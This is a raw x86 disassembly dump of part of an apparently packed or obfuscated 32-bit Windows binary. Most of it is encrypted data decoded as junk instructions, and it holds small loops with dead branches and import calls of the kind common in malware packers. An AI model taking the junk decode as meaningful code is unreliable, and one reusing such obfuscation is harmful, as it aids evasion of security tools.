  40ec44:	pop    edi
  40ec45:	mov    eax,0x6bedd546
  40ec4a:	fwait
  40ec4b:	inc    edi
  40ec4c:	mov    dh,0xc6
  40ec4e:	(bad)  
  40ec4f:	icebp  
  40ec50:	jno    0x40ecab
  40ec52:	adc    DWORD PTR [esi-0x1647a103],esi
  40ec58:	fbld   TBYTE PTR [edi-0x4bf4e309]
  40ec5e:	rcr    BYTE PTR [ebx+0x3bc1601],0x79
  40ec65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec66:	xor    BYTE PTR [edi+0x718fb983],bl
  40ec6c:	(bad)  
  40ec6d:	stos   DWORD PTR es:[edi],eax
  40ec6e:	test   al,0xbb
  40ec70:	and    cl,BYTE PTR [ecx]
  40ec72:	push   ebx
  40ec73:	leave  
  40ec74:	leave  
  40ec75:	shr    BYTE PTR [ebp+ecx*1-0x65845523],1
  40ec7c:	dec    DWORD PTR [edi]
  40ec7e:	(bad)  
  40ec7f:	cs in  eax,0x5e
  40ec82:	fidiv  WORD PTR [ebx]
  40ec84:	mov    esi,0xf8a9d4e8
  40ec89:	repz add esi,DWORD PTR [esi+ebx*4]
  40ec8d:	fdivr  QWORD PTR [bx+di+0x21e]
  40ec92:	out    dx,eax
  40ec93:	jecxz  0x40ec90
  40ec95:	xor    BYTE PTR [ebp-0x44e79d6],dh
  40ec9b:	mov    edi,0x825a188d
  40eca0:	inc    eax
  40eca1:	hlt    
  40eca2:	mov    edx,0xdc7406eb
  40eca7:	cmp    al,0xce
  40eca9:	mov    ebx,0x64bbc578
  40ecae:	rcr    DWORD PTR [ebp+ecx*4+0x341fcf83],cl
  40ecb5:	pop    edi
  40ecb6:	cwde   
  40ecb7:	and    edi,0x77
  40ecba:	cdq    
  40ecbb:	mov    ds:0x92d87efc,al
  40ecc0:	(bad)  
  40ecc1:	sbb    al,BYTE PTR [edi+0x6781c7bd]
  40ecc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc8:	mov    edi,0x4470b983
  40eccd:	inc    edx
  40ecce:	xchg   edx,eax
  40eccf:	mov    cl,0xa5
  40ecd1:	mov    eax,edi
  40ecd3:	add    BYTE PTR [esi],cl
  40ecd5:	lea    edi,[eax]
  40ecd7:	lea    edx,[esi+ebp*8+0x32]
  40ecdb:	imul   ebp,DWORD PTR [esi+0x71],0x57
  40ecdf:	cmp    bh,BYTE PTR [ebx+0x72]
  40ece2:	clc    
  40ece3:	into   
  40ece4:	adc    dl,bh
  40ece6:	add    edi,DWORD PTR [ebp+0x19]
  40ece9:	test   BYTE PTR [edx],bl
  40eceb:	cmp    ch,al
  40eced:	imul   eax,edi,0x46
  40ecf0:	and    eax,0xa9acad7c
  40ecf5:	lahf   
  40ecf6:	add    eax,0x703a6329
  40ecfb:	inc    esp
  40ecfc:	xchg   esi,eax
  40ecfd:	rol    DWORD PTR [ecx-0x7d289d6a],1
  40ed03:	scas   eax,DWORD PTR es:[edi]
  40ed04:	dec    esp
  40ed05:	sbb    BYTE PTR [ebx-0x1],0x88
  40ed09:	and    DWORD PTR [ebp*1-0x27aa24e0],ebp
  40ed10:	sti    
  40ed11:	pop    ds
  40ed12:	out    0x35,eax
  40ed14:	or     BYTE PTR [ebp+0x31],ch
  40ed17:	xor    edi,DWORD PTR [eax+0x6]
  40ed1a:	es or  eax,0xb8d9d904
  40ed20:	xchg   DWORD PTR [ebx],ecx
  40ed22:	xor    esi,DWORD PTR [edx+0x1]
  40ed25:	jns    0x40ed1b
  40ed27:	jne    0x40ece7
  40ed29:	std    
  40ed2a:	jbe    0x40ecbb
  40ed2c:	pop    edi
  40ed2d:	lods   al,BYTE PTR ds:[esi]
  40ed2e:	mov    edx,0x42a1d9ee
  40ed33:	cmp    al,BYTE PTR [esi+0x52]
  40ed36:	out    0xcd,al
  40ed38:	mov    esp,0xaa3ef74f
  40ed3d:	loopne 0x40ece2
  40ed3f:	repz daa 
  40ed41:	or     al,BYTE PTR [edx-0x2f]
  40ed44:	xor    eax,0x7fc1790c
  40ed49:	xor    ebp,DWORD PTR [edi-0x3e]
  40ed4c:	cli    
  40ed4d:	add    ecx,DWORD PTR [ebx+0x66]
  40ed50:	sbb    DWORD PTR [edx+0x16],edi
  40ed53:	mov    DWORD PTR [edi+esi*1+0x4ebc7b59],esi
  40ed5a:	adc    ebp,DWORD PTR [eax]
  40ed5c:	das    
  40ed5d:	pop    edi
  40ed5e:	mov    dl,BYTE PTR [ebp+0x26e20cbd]
  40ed64:	rol    DWORD PTR [ecx+0x69f6bfd0],0x58
  40ed6b:	pop    ecx
  40ed6c:	add    eax,DWORD PTR [ebp-0x54a0fde4]
  40ed72:	sub    ch,BYTE PTR [eax-0xd601b1f]
  40ed78:	cwde   
  40ed79:	push   esi
  40ed7a:	loop   0x40ed66
  40ed7c:	inc    ecx
  40ed7d:	pop    ss
  40ed7e:	ficomp WORD PTR [edi]
  40ed80:	(bad)  
  40ed81:	jecxz  0x40ed1e
  40ed83:	ss aaa 
  40ed85:	fcom   QWORD PTR [ebp+0x18]
  40ed88:	mov    DWORD PTR [ecx-0x2b],0x8c0b9e53
  40ed8f:	popf   
  40ed90:	or     al,0x62
  40ed92:	std    
  40ed93:	sbb    esi,0xdd6087d2
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x53da460]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	addr16 std 
  40ee78:	push   DWORD PTR [ecx]
  40ee7a:	mov    ds:0x5d4b3b3f,eax
  40ee7f:	ss dec ebp
  40ee81:	fwait
  40ee82:	pop    eax
  40ee83:	add    ebx,DWORD PTR [ebp-0x52]
  40ee86:	aam    0xd0
  40ee88:	(bad)  
  40ee89:	push   edx
  40ee8a:	ins    DWORD PTR es:[edi],dx
  40ee8b:	push   0x22
  40ee8d:	jl     0x40ee7b
  40ee8f:	es or  ebp,ebx
  40ee92:	adc    BYTE PTR [ecx],0xe8
  40ee95:	fwait
  40ee96:	outs   dx,BYTE PTR ds:[esi]
  40ee97:	gs xchg edi,eax
  40ee99:	rol    BYTE PTR [edx+eax*4-0x1a],1
  40ee9d:	sbb    dl,BYTE PTR [edi+eax*1-0x22]
  40eea1:	pop    ds
  40eea2:	cmc    
  40eea3:	cmp    eax,0xe1b0d07c
  40eea8:	int3   
  40eea9:	jecxz  0x40ef25
  40eeab:	cmp    al,0xa9
  40eead:	es pop ecx
  40eeaf:	mov    bh,0x35
  40eeb1:	mov    dh,0xc4
  40eeb3:	dec    edx
  40eeb4:	cmc    
  40eeb5:	retf   
  40eeb6:	jae    0x40ef06
  40eeb8:	add    al,0x2c
  40eeba:	int3   
  40eebb:	lods   al,BYTE PTR ds:[esi]
  40eebc:	xor    ah,BYTE PTR [edx-0x25280a]
  40eec2:	xchg   edi,eax
  40eec3:	test   dl,dh
  40eec5:	adc    eax,0xe956b411
  40eeca:	cs leave 
  40eecc:	repz clc 
  40eece:	fcmovbe st,st(2)
  40eed0:	shl    DWORD PTR [esi+0x4bbf4bbf],0xfa
  40eed7:	sub    al,0x2
  40eed9:	inc    ebx
  40eeda:	rcr    bl,cl
  40eedc:	mov    esp,0xaa0186cd
  40eee1:	or     al,0xab
  40eee3:	call   0x6d1a:0x850ac6ea
  40eeea:	cs inc esp
  40eeec:	cmp    DWORD PTR ds:0xadcd0171,0xffffff8a
  40eef3:	sub    ecx,edx
  40eef5:	xchg   DWORD PTR [esi+0x59c83e47],esi
  40eefb:	into   
  40eefc:	outs   dx,DWORD PTR ds:[esi]
  40eefd:	mov    al,0x96
  40eeff:	dec    ebp
  40ef00:	shl    BYTE PTR [edi+0x31f1e562],1
  40ef06:	cs jp  0x40ee94
  40ef09:	mov    ebp,DWORD PTR [edx+0x53]
  40ef0c:	sub    cl,BYTE PTR [edi]
  40ef0e:	hlt    
  40ef0f:	cdq    
  40ef10:	jle    0x40eee2
  40ef12:	or     BYTE PTR [ecx+ebx*1-0x4e35f24d],bl
  40ef19:	sub    esi,eax
  40ef1b:	mov    esi,0xd4778d60
  40ef20:	fcomip st,st(1)
  40ef22:	xchg   ebp,eax
  40ef23:	or     ecx,DWORD PTR [edx+0x28]
  40ef26:	mov    edi,0xa39bbf96
  40ef2b:	fs out dx,al
  40ef2d:	mov    esp,0x307bfa26
  40ef32:	imul   ebp,DWORD PTR [edx-0x2c],0xffffffcf
  40ef36:	repz mov ebx,0x92a3b6d6
  40ef3c:	clc    
  40ef3d:	mov    bh,0x74
  40ef3f:	sbb    DWORD PTR ds:0xf770d82,ebp
  40ef45:	call   0x9a21:0xe3613459
  40ef4c:	shl    BYTE PTR [edx+0x73664bdf],0x2c
  40ef53:	inc    esp
  40ef54:	mov    DWORD PTR [edi+0x3b592617],esi
  40ef5a:	sub    eax,DWORD PTR [ebx+0x2c70dd24]
  40ef60:	arpl   bp,sp
  40ef62:	dec    esi
  40ef63:	in     eax,0x70
  40ef65:	or     al,BYTE PTR [edx+0x7a018231]
  40ef6b:	out    0xf0,al
  40ef6d:	xor    eax,0x7ae55cec
  40ef72:	push   eax
  40ef73:	or     al,0xaa
  40ef75:	fist   DWORD PTR [edx+0xd177261]
  40ef7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef7c:	mov    bl,0x9f
  40ef7e:	sbb    BYTE PTR [edi-0x3127fc97],al
  40ef84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef85:	xor    eax,0x3c33be17
  40ef8a:	xchg   BYTE PTR ss:[ebp+0x200ce7e5],dl
  40ef91:	xor    BYTE PTR [ebp+0x34812c4b],al
  40ef97:	out    0x7f,al
  40ef99:	adc    esp,0x4e
  40ef9c:	cmp    dh,BYTE PTR [edi]
  40ef9e:	cmp    eax,0x8e46aa9e
  40efa3:	dec    ecx
  40efa4:	pop    ebx
  40efa5:	mov    edx,0xf14bf8b3
  40efaa:	sub    edi,DWORD PTR [ecx]
  40efac:	leave  
  40efad:	ss mov bl,0xa
  40efb0:	mov    eax,0x8d307c7b
  40efb5:	nop
  40efb6:	sbb    ebp,DWORD PTR [esi-0x3e]
  40efb9:	nop
  40efba:	xchg   edx,eax
  40efbb:	sbb    DWORD PTR ss:[edi],ecx
  40efbe:	(bad)  
  40efbf:	pop    ss
  40efc0:	dec    ebx
  40efc1:	fsub   st(2),st
  40efc3:	popa   
  40efc4:	jae    0x40ef4f
  40efc6:	je     0x40ef67
  40efc8:	inc    esp
  40efc9:	popa   
  40efca:	clc    
  40efcb:	(bad)  
  40efcc:	std    
  40efcd:	push   ebx
  40efce:	das    
  40efcf:	les    ebp,FWORD PTR [ebx-0x7]
  40efd2:	scas   al,BYTE PTR es:[edi]
  40efd3:	push   ss
  40efd4:	and    cl,al
  40efd6:	sbb    DWORD PTR [eax],0x45
  40efd9:	cmp    al,0xf7
  40efdb:	cdq    
  40efdc:	xchg   edi,eax
  40efdd:	xchg   edx,eax
  40efde:	cmp    BYTE PTR [edi],0xc5
  40efe1:	sub    BYTE PTR [ebp-0x27],al
  40efe4:	popf   
  40efe5:	ds repnz add eax,0x8b587d30
  40efec:	dec    ebx
  40efed:	push   eax
  40efee:	pushf  
  40efef:	push   edi
  40eff0:	mov    al,0x16
  40eff2:	xor    BYTE PTR [ebx+0x5b],0x2c
  40eff6:	loope  0x40f04b
  40eff8:	inc    ebp
  40eff9:	add    al,0xf
  40effb:	xlat   BYTE PTR ds:[ebx]
  40effc:	xor    bh,BYTE PTR [ebp+0x17]
  40efff:	int3   
  40f000:	lods   eax,DWORD PTR ds:[esi]
  40f001:	sti    
  40f002:	push   esi
  40f003:	out    dx,al
  40f004:	fs sahf 
  40f006:	out    dx,al
  40f007:	ds xchg edi,eax
  40f009:	fsub   QWORD PTR [edi+0x2c]
  40f00c:	test   DWORD PTR [ecx-0x11],ebx
  40f00f:	and    al,0xb4
  40f011:	loopne 0x40f081
  40f013:	into   
  40f014:	mov    bh,0xa9
  40f016:	pop    ebx
  40f017:	mov    ds:0x1cec9aff,al
  40f01c:	pushf  
  40f01d:	adc    BYTE PTR [ecx-0x17],cl
  40f020:	mov    ebp,eax
  40f022:	js     0x40f087
  40f024:	push   0x1c
  40f026:	retf   
  40f027:	lods   al,BYTE PTR ds:[esi]
  40f028:	cmp    ebx,ebp
  40f02a:	adc    DWORD PTR [ecx+eiz*8+0x73],ecx
  40f02e:	out    dx,al
  40f02f:	jge    0x40f096
  40f031:	repz leave 
  40f033:	mov    ecx,0xa0749770
  40f038:	fnstcw WORD PTR [eax]
  40f03a:	jno    0x40f060
  40f03c:	js     0x40efd3
  40f03e:	nop
  40f03f:	cld    
  40f040:	call   0xb564:0x25b51bd1
  40f047:	push   0xffffff83
  40f049:	lahf   
  40f04a:	lds    eax,FWORD PTR [edx-0xfe32fd9]
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x846f1594,ebx
  40f076:	add    ecx,ebx
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	in     al,dx
  40f081:	test   DWORD PTR [edi],edx
  40f083:	jno    0x40f06b
  40f085:	inc    edi
  40f086:	mov    ecx,0x751b5785
  40f08b:	and    BYTE PTR [eax-0x4f],cl
  40f08e:	inc    ecx
  40f08f:	mov    al,0x3c
  40f091:	rcl    ch,0x76
  40f094:	push   ebx
  40f095:	rcr    ecx,0xd0
  40f098:	sub    BYTE PTR [ecx+0x3c08e032],dl
  40f09e:	inc    eax
  40f09f:	aas    
  40f0a0:	jnp    0x40f026
  40f0a2:	aam    0x80
  40f0a4:	repnz in al,dx
  40f0a6:	mov    ecx,0xaa5f4445
  40f0ab:	mov    cs,WORD PTR [esi]
  40f0ad:	pushf  
  40f0ae:	push   ecx
  40f0af:	mov    ecx,0x8c950f76
  40f0b4:	jmp    0x5771:0x1257a08b
  40f0bb:	xchg   BYTE PTR [esi-0x7653dce],bh
  40f0c1:	inc    esp
  40f0c2:	push   eax
  40f0c3:	ja     0x40f12e
  40f0c5:	xchg   edx,eax
  40f0c6:	jge    0x40f0bd
  40f0c8:	cmc    
  40f0c9:	addr16 push 0xd68b87d1
  40f0cf:	out    dx,eax
  40f0d0:	xchg   DWORD PTR [ecx],edi
  40f0d2:	dec    edi
  40f0d3:	adc    bh,0x5c
  40f0d6:	xor    BYTE PTR [ebp+0x5f5fe0f9],cl
  40f0dc:	das    
  40f0dd:	in     al,0x4c
  40f0df:	dec    edi
  40f0e0:	call   0xb1b601a0
  40f0e5:	popa   
  40f0e6:	aas    
  40f0e7:	and    al,0xa2
  40f0e9:	test   eax,0x6d978999
  40f0ee:	jmp    0x40f084
  40f0f0:	icebp  
  40f0f1:	and    DWORD PTR [eax-0x5f],edi
  40f0f4:	xchg   esp,eax
  40f0f5:	or     ebp,esp
  40f0f7:	jnp    0x40f10f
  40f0f9:	dec    esi
  40f0fa:	popf   
  40f0fb:	imul   eax,DWORD PTR [ebp+0x4c],0x274586b3
  40f102:	fs ja  0x40f114
  40f105:	sbb    al,0xed
  40f107:	jns    0x40f11b
  40f109:	mov    ebp,0x4799b77
  40f10e:	mov    edi,0xf6bbc25c
  40f113:	add    DWORD PTR [esi],0x24
  40f116:	out    dx,al
  40f117:	or     esi,ecx
  40f119:	jno    0x40f0a8
  40f11b:	aad    0x92
  40f11d:	scas   al,BYTE PTR es:[edi]
  40f11e:	sbb    DWORD PTR [ebp+0x4cd20b9d],0xa7b69325
  40f128:	mov    cl,0x13
  40f12a:	data16 fmul DWORD PTR ds:[esi-0x56cf133]
  40f132:	and    esp,esi
  40f134:	jbe    0x40f174
  40f136:	xor    ebp,esp
  40f138:	sbb    BYTE PTR [ecx],ch
  40f13a:	js     0x40f155
  40f13c:	je     0x40f184
  40f13e:	xchg   ecx,eax
  40f13f:	xchg   ebx,eax
  40f140:	push   cs
  40f141:	mov    edx,DWORD PTR [ecx-0x4b063616]
  40f147:	cld    
  40f148:	jb     0x40f13f
  40f14a:	mov    ds:0xcc3b3d6c,al
  40f14f:	and    al,0x7d
  40f151:	or     al,dh
  40f153:	aaa    
  40f154:	out    0x35,al
  40f156:	dec    esi
  40f157:	aas    
  40f158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f159:	daa    
  40f15a:	retf   0xd94c
  40f15d:	sub    esp,esi
  40f15f:	or     edx,esi
  40f161:	pop    ss
  40f162:	aam    0x51
  40f164:	pop    ss
  40f165:	imul   esp,DWORD PTR [ecx-0x79],0x3236c652
  40f16c:	mov    ds:0xda0e61c,al
  40f171:	xor    bl,BYTE PTR [eax]
  40f173:	sub    DWORD PTR ds:0x65c8aa54,esi
  40f179:	(bad)  
  40f17a:	retfw  
  40f17c:	or     eax,0x6ab9b71e
  40f181:	lahf   
  40f182:	add    DWORD PTR [edx+0x76],0x608754a5
  40f189:	adc    BYTE PTR [ebx+eiz*8+0x7d],ah
  40f18d:	aam    0x98
  40f18f:	hlt    
  40f190:	outs   dx,DWORD PTR ds:[esi]
  40f191:	jle    0x40f197
  40f193:	nop
  40f194:	data16 jb 0x40f14c
  40f197:	mov    cl,0xf1
  40f199:	adc    DWORD PTR [ebx-0xee98ad7],0x1b43dc75
  40f1a3:	adc    eax,0xffb61477
  40f1a8:	and    DWORD PTR [ecx-0x19],esp
  40f1ab:	xlat   BYTE PTR ds:[ebx]
  40f1ac:	jae    0x40f1b1
  40f1ae:	je     0x40f1de
  40f1b0:	push   eax
  40f1b1:	mov    al,0xb8
  40f1b3:	arpl   WORD PTR [edi],ax
  40f1b5:	sti    
  40f1b6:	scas   al,BYTE PTR es:[edi]
  40f1b7:	cs mov eax,0x3e5f5abc
  40f1bd:	xor    DWORD PTR [ebp+0x1],0xffffff8e
  40f1c1:	aaa    
  40f1c2:	cmp    edi,DWORD PTR [eax+0x4c]
  40f1c5:	retf   
  40f1c6:	lea    esp,[edx-0x42]
  40f1c9:	add    al,0x50
  40f1cb:	xchg   edx,eax
  40f1cc:	mov    bl,0xd7
  40f1ce:	dec    esi
  40f1cf:	inc    ebx
  40f1d0:	ins    DWORD PTR es:[edi],dx
  40f1d1:	sub    al,0x5f
  40f1d3:	cs loopne 0x40f23e
  40f1d6:	scas   al,BYTE PTR es:[edi]
  40f1d7:	add    ch,ch
  40f1d9:	les    ecx,FWORD PTR [eax]
  40f1db:	mov    al,ds:0xfcff9d67
  40f1e0:	and    eax,0xf5142343
  40f1e5:	mov    dh,BYTE PTR [ebx-0x195a384b]
  40f1eb:	int3   
  40f1ec:	int3   
  40f1ed:	ret    0xc1ab
  40f1f0:	or     dh,BYTE PTR [ebx+0x7]
  40f1f3:	pop    ecx
  40f1f4:	daa    
  40f1f5:	fild   QWORD PTR [eax]
  40f1f7:	xchg   ecx,eax
  40f1f8:	mov    bh,0xa3
  40f1fa:	not    DWORD PTR [edi]
  40f1fc:	(bad)  
  40f1fd:	std    
  40f1fe:	jg     0x40f269
  40f200:	sti    
  40f201:	pop    edi
  40f202:	addr16 push ds
  40f204:	inc    edx
  40f205:	bound  eax,QWORD PTR [ebp+ecx*2+0x73]
  40f209:	and    edi,eax
  40f20b:	fld    DWORD PTR [eax-0x79f74f9a]
  40f211:	xchg   edx,eax
  40f212:	sbb    al,0xf0
  40f214:	pop    esi
  40f215:	xor    BYTE PTR [edi+0x5f1f740b],0xc7
  40f21c:	mov    edx,0xbe996f47
  40f221:	or     BYTE PTR [ebp+0x7e2971fa],0x3d
  40f228:	stos   BYTE PTR es:[edi],al
  40f229:	in     al,0x19
  40f22b:	mov    ebx,0xff0d6f43
  40f230:	and    ebp,DWORD PTR [ecx]
  40f232:	pop    eax
  40f233:	pop    ds
  40f234:	dec    edi
  40f235:	mov    cl,0x9f
  40f237:	mov    ds:0xcee9e840,eax
  40f23c:	xchg   BYTE PTR [eax-0x65915d78],bh
  40f242:	mov    DWORD PTR [edi+0x1f],eax
  40f245:	cmp    eax,esi
  40f247:	data16 mov al,ds:0xb758ace6
  40f24d:	fisubr DWORD PTR [esi]
  40f24f:	xchg   BYTE PTR [ebp+edx*8+0x69],bl
  40f253:	jecxz  0x40f2a1
  40f255:	xlat   BYTE PTR ds:[ebx]
  40f256:	sbb    DWORD PTR [edi],esi
  40f258:	dec    ebp
  40f259:	call   0xcc6240b0
  40f25e:	jle    0x40f25a
  40f260:	add    ah,BYTE PTR [edx+0x75]
  40f263:	dec    ebx
  40f264:	xchg   ecx,eax
  40f265:	cli    
  40f266:	xchg   ecx,eax
  40f267:	cmp    ecx,DWORD PTR [edi-0x7]
  40f26a:	shr    DWORD PTR [edi],0x54
  40f26d:	cmc    
  40f26e:	cmp    esp,DWORD PTR [edi]
  40f270:	nop
  40f271:	inc    edx
  40f272:	and    DWORD PTR ds:0x8c248cc9,ecx
  40f278:	pop    edx
  40f279:	mov    ebp,ecx
  40f27b:	dec    esi
  40f27c:	inc    edx
  40f27d:	neg    BYTE PTR [ecx]
  40f27f:	es mov dh,ah
  40f282:	jg     0x40f209
  40f284:	mov    dx,0xe396
  40f288:	inc    ebp
  40f289:	and    eax,DWORD PTR ds:0xe412877d
  40f28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f290:	pusha  
  40f291:	div    BYTE PTR [esi+0x36f72bba]
  40f297:	sub    al,cl
  40f299:	mov    al,0x87
  40f29b:	cdq    
  40f29c:	cwde   
  40f29d:	out    dx,al
  40f29e:	mov    ?,WORD PTR [ebp-0x222b4937]
  40f2a4:	mov    al,BYTE PTR [edi+0x37]
  40f2a7:	pop    es
  40f2a8:	pop    edx
  40f2a9:	push   esp
  40f2aa:	into   
  40f2ab:	leave  
  40f2ac:	bound  edi,QWORD PTR [ebx+0x34]
  40f2af:	or     DWORD PTR [ecx-0x1b65680e],ebp
  40f2b5:	mov    eax,0x5676f833
  40f2ba:	inc    ebx
  40f2bb:	repz out 0x76,al
  40f2be:	cmc    
  40f2bf:	and    esi,esp
  40f2c1:	and    ebx,eax
  40f2c3:	or     DWORD PTR [edi-0x47],0x25
  40f2c7:	pop    ebx
  40f2c8:	mov    ds:0x466dae4c,al
  40f2cd:	sahf   
  40f2ce:	out    dx,al
  40f2cf:	xor    al,0x32
  40f2d1:	(bad)  [ebp+0x85c18a9]
  40f2d7:	mov    eax,0xc0c92a2
  40f2dc:	ret    
  40f2dd:	ins    DWORD PTR es:[edi],dx
  40f2de:	and    dh,BYTE PTR [edx]
  40f2e0:	scas   eax,DWORD PTR es:[edi]
  40f2e1:	scas   al,BYTE PTR es:[edi]
  40f2e2:	mov    bh,0x9
  40f2e4:	les    ecx,FWORD PTR [ecx-0x4392a3c0]
  40f2ea:	inc    edx
  40f2eb:	dec    ecx
  40f2ec:	adc    eax,0x627d5eb0
  40f2f1:	sbb    DWORD PTR [ebx+0x6f],esi
  40f2f4:	cmovne ebx,DWORD PTR [eax]
  40f2f7:	aam    0xd9
  40f2f9:	les    edx,FWORD PTR [edx+0x63e85beb]
  40f2ff:	xor    BYTE PTR ds:0xa3596a1d,dl
  40f305:	inc    edi
  40f306:	jbe    0x40f322
  40f308:	dec    edx
  40f309:	cmp    ecx,esp
  40f30b:	mov    cl,0xfb
  40f30d:	mov    ds,ebx
  40f30f:	fcmovnu st,st(7)
  40f311:	mov    DWORD PTR [esi],0x4c3b8532
  40f317:	xor    bh,BYTE PTR [edx-0x75]
  40f31a:	imul   BYTE PTR [edx*4+0x3bdfed8c]
  40f321:	mov    WORD PTR [edi+0x29],ss
  40f324:	add    eax,0xa7e801d
  40f329:	or     esp,DWORD PTR [ebp+0x2]
  40f32c:	test   al,0x38
  40f32e:	add    al,0xde
  40f330:	inc    ebp
  40f331:	adc    ebx,edi
  40f333:	push   ebp
  40f334:	pop    ss
  40f335:	xor    dl,BYTE PTR [ebx+0x4a4b1916]
  40f33b:	cmc    
  40f33c:	push   esi
  40f33d:	into   
  40f33e:	in     al,0xfb
  40f340:	sbb    ah,ch
  40f342:	aad    0x1
  40f344:	sbb    ebx,eax
  40f346:	cld    
  40f347:	aaa    
  40f348:	lahf   
  40f349:	xchg   ebx,eax
  40f34a:	pop    eax
  40f34b:	sub    eax,0xf02df237
  40f350:	int3   
  40f351:	mov    gs:0xa584fcbd,al
  40f357:	int3   
  40f358:	inc    esi
  40f359:	lock jge 0x40f2e1
  40f35c:	or     al,0x7d
  40f35e:	je     0x40f31e
  40f360:	xor    DWORD PTR [edi+0x4e],esi
  40f363:	jecxz  0x40f3ad
  40f365:	test   DWORD PTR [ecx-0x30],ebx
  40f368:	ss fcmovnb st,st(4)
  40f36b:	std    
  40f36c:	xor    eax,DWORD PTR [esi-0x41]
  40f36f:	push   0xffffffbe
  40f371:	hlt    
  40f372:	cs inc ebx
  40f374:	repnz xor eax,0xb3367b71
  40f37a:	cmp    edx,DWORD PTR [edx+0x5c9043a3]
  40f380:	gs loope 0x40f33b
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	aaa    
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
